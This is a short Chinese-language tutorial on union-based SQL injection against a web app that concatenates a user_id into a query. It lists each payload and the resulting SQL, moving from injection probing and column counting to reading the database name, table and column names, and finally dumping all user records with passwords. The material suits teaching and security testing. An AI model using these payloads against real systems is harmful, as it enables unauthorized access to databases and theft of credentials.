# 联合查询注入
如果web服务器做sql拼接查询而不预防sql注入，并且直接回显查询结果，可以使用联合查询注入sql获取数据库信息，案例如下
~~~sql
# 直接拼接查询的字段user_id
select first_name, last_name from users where user_id = '$id';


# 首先检查是否存在sql注入，以及查询的user_id的数据类型，是字符串还是数字
# 输入的user_id是 1' and '1'='2 这样完整的sql如下
select first_name, last_name from users where user_id = '1' and '1'='2';
# 执行sql返回结果如果是空，可以得出结论user_id字段可能是字符串，如果执行报错就说明user_id不是字符串

# 输入的user_id是 1' or '123'='123 这样完整的sql如下
select first_name, last_name from users where user_id = '1' or '123'='123';
# 执行sql返回结果如果获得了表的全部数据，可以得出结论user_id字段就是字符串，如果执行报错就说明user_id不是字符串，可以尝试修改输入去除单引号判断字段是否是数字类型


# 确定字段类型后判断这个表存在的字段数量
# 输入的user_id是 1' or '1'='1' order by 1 # 这样完整的sql如下
select first_name, last_name from users where user_id = '1' or '1'='1' order by 1 #';
# 使用#注释末尾的单引号，这样可以查询这张表的全部数据并且按照第一列进行排序，依次增加改变排序列数，直到无法对指定的列数进行排序出现报错可以确定表中的列数


# 确定sql查询输出的字段有几列
# 输入的user_id是 1' and 1=2 union select 1,2 # 这样完整的sql如下
select first_name, last_name from users where user_id = '1' and 1=2 union select 1,2 #';
# 通过不断的尝试增加设置union连接表的列数直到可以正常的输出连接表，这样就可以确定sql查询输出的字段有几列

# 获取当前使用数据库名称
# 输入的user_id是 1' and 1=2 union select 1,database() # 这样完整的sql如下
select first_name, last_name from users where user_id = '1' and 1=2 union select 1,database() #';
# 执行sql可以获取当前使用数据库名称

# 获取当前数据库中的表名
# 输入的user_id是 1' and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 这样完整的sql如下
select first_name, last_name from users where user_id = '1' and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #';
# 执行sql可以从元数据库中获取当前数据库下的表名

# 获取对应表下的字段名称
# 输入的user_id是 1' and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' # 这样完整的sql如下
select first_name, last_name from users where user_id = '1' and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #';
# 执行sql可以从元数据库中获取对应表users下的字段名称

# 获取上述信息后可以查询数据库中任意表的数据
# 输入的user_id是 1' and 1=2 union select group_concat(user_id, first_name, last_name), group_concat(passward) from users # 这样完整的sql如下
select first_name, last_name from users where user_id = '1' and 1=2 union select group_concat(user_id, first_name, last_name), group_concat(passward) from users #';
# 执行sql可以查询users中的所有字段数据了
~~~